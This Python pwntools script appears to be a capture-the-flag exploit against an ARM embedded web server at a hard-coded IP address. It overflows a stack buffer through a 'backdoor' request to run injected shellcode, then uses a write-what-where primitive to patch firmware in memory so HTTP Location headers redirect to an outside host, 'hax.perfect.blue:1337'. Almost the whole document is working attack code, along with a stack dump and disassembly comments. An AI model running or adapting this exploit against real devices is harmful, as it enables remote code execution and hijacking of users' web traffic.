import time

from pwn import *

connection_logger = getLogger("pwnlib.tubes.remote")
connection_logger.setLevel("warning")

bof_start = 0x60E4293C

stack_snapshot = """
 04 00 00 00  10 10 10 10  54 29 e4 60  bc 29 e4 60
 68 a9 e3 60  84 29 e4 60  84 29 e4 60  08 ac e4 60
 ff ff ff ff  bc 29 e4 60  68 a9 e3 60  c0 25 de 61
 00 00 00 00  44 2d 00 00  01 00 00 00  68 a9 e3 60
 62 61 63 6b  64 6f 6f 72  7c 29 e4 60  02 02 00 00
 00 00 02 02  08 42 9a 60  f0 28 cd 61  ff ff ff ff
 dc 26 cd 61  01 00 00 00  04 04 04 04  d4 29 e4 60
 30 cb 04 60  06 06 06 06  00 00 00 00  08 08 08 08
 08 42 9a 60  00 00 00 00  1f 00 00 60  01 00 00 00
 1f 00 00 20  11 11 11 11  00 00 00 00  00 00 00 00
 00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
 68 00 00 80  10 29 e4 60  00 00 00 00  e4 40 9a 60
 e4 40 9a 60  f0 29 e4 60  dc 40 9a 60  01 00 00 00
 94 a9 e3 60  94 a9 e3 60  f0 29 e4 60  00 00 00 00
 06 00 00 00  e8 a9 e3 60  65 72 78 00  00 00 00 00
 00 00 00 00  05 00 00 00  00 00 00 00  06 00 00 00
 00 00 00 00  09 00 00 00  00 00 00 00  00 00 00 00
 00 00 00 00  00 00 00 00  80 00 00 80  ac 2a e4 60
 b4 2a e4 60  cc 2a e4 60  b0 2a e4 60  00 00 00 00
 70 2a e4 60  ff ff ff ff  70 2a e4 60  70 2a e4 60
 01 00 00 00  84 2a e4 60  ff ff ff ff  f8 aa e4 60
 f8 aa e4 60  00 00 00 00  08 00 00 00  04 00 00 00
 ff ff 00 00  00 00 00 00  00 00 00 00  00 00 00 00
 f4 2a e5 60  f4 2a e5 60  fc 2b e5 60  b4 2a e5 60
 f4 2a e5 60  f4 2a e5 60  b4 2a e5 60  f4 2a e5 60
 00 00 00 00  00 00 00 00  08 80 00 80  a5 a5 a5 a5
 a5 a5 a5 a5  a5 a5 a5 a5  a5 a5 a5 a5  a5 a5 a5 a5
"""
stack_snapshot = bytes.fromhex(stack_snapshot)


def run_shellcode(shellcode):
    assert len(shellcode) % 4 == 0
    if len(shellcode) > 20:
        raise ValueError("shellcode must be <= 20 bytes")

    shellcode = bytearray(shellcode)
    while len(shellcode) < 20:
        shellcode += p32(0xE1A00000)  # nop
    assert len(shellcode) == 20

    # r = io.connect(("127.0.0.1", 5555))
    r = remote("8.210.44.156", 49392)

    padding = 58

    r.send(b"GET /")
    time.sleep(0.2)
    for x in b"backdoor":
        n = x - padding
        r.send(b"P" * n)
        time.sleep(0.2)

    payload = bytearray(stack_snapshot[0x36:])
    payload[0:2] = b"XD"
    payload[2:22] = shellcode
    payload[22:26] = p32(0xE51FF004)  # ldr pc, [pc, #-4]
    payload[26:30] = payload[58:62]
    payload[58:62] = p32(bof_start + 0x36 + 2)
    payload += b"Z" * (514 - padding - len(payload))

    r.send(payload)
    r.close()


def write_what_where(where, what):
    log.info("WRITE %08x <- %08x", where, what)

    def frobnicate(x):
        return (x & 0xFFF) | (x << 4 & 0xF0000)

    magic = [
        0xE3001000 + frobnicate(what & 0xFFFF),
        0xE3401000 + frobnicate(what >> 16 & 0xFFFF),
        0xE3002000 + frobnicate(where & 0xFFFF),
        0xE3402000 + frobnicate(where >> 16 & 0xFFFF),
        0xE5821000,
    ]
    shellcode = b"".join((p32(x) for x in magic))
    run_shellcode(shellcode)


def upload(addr, content):
    content_len = len(content)
    if content_len % 4 != 0:
        content = content.ljust((content_len + 3) // 4 * 4, b"\x00")

    for i in range(0, len(content), 4):
        write_what_where(addr + i, u32(content[i : i + 4]))


upload(0x63000000, b"http://hax.perfect.blue:1337\x00")
upload(0x60E7C17C, p32(0x63000000))

upload(0x63001000, b"/action/backdoor\x00")
upload(0x60E7BB60, p32(0x63001000))
upload(0x60E7C1B0, p32(0x63001000))
upload(0x60E7BB64, p32(16))
upload(0x60E7C1B4, p32(16))

# asm("B 0x6004D26c", vma=0x6004D20C)
upload(0x6004D20C, b"\x16\x00\x00\xea")

# asm("movw r3, #0xeaa8\nmovt r3, #0x6004")
upload(0x6004D26C, b"\xa8:\x0e\xe3\x040F\xe3")

"""
ROM:60058B90                 LDR             R3, [R11,#var_30]
ROM:60058B94                 MOV             R2, #aS_4 ; "%s"
ROM:60058B9C                 MOV             R1, #aLocation ; "Location"
ROM:60058BA4                 LDR             R0, [R11,#var_28]
ROM:60058BA8                 BL              websWriteHeader
ROM:60058BAC                 B               loc_60058C00
===>
ROM:60058BA4                 LDR             R0, [R11,#var_28]
ROM:60058B90                 LDR             R3, [R0, #0x178]
ROM:60058B94                 MOV             R2, "http://hax.perfect.blue:1337/%s"
ROM:60058B9C                 MOV             R1, #aLocation ; "Location"
ROM:60058BA8                 BL              websWriteHeader
ROM:60058BAC                 B               loc_60058C00
"""

upload(0x63002000, b"http://hax.perfect.blue:1337/%s\x00")

overwrite = b"(\x00\x1b\xe5x1\x90\xe5"
# asm("movw r2, #0x2000\nmovt r2, #0x6300")
overwrite += b"\x00 \x02\xe3\x00#F\xe3"
# Location
overwrite += b"\xe4\x13\x06\xe3\x07\x10\x46\xe3"
upload(0x60058B90, overwrite)
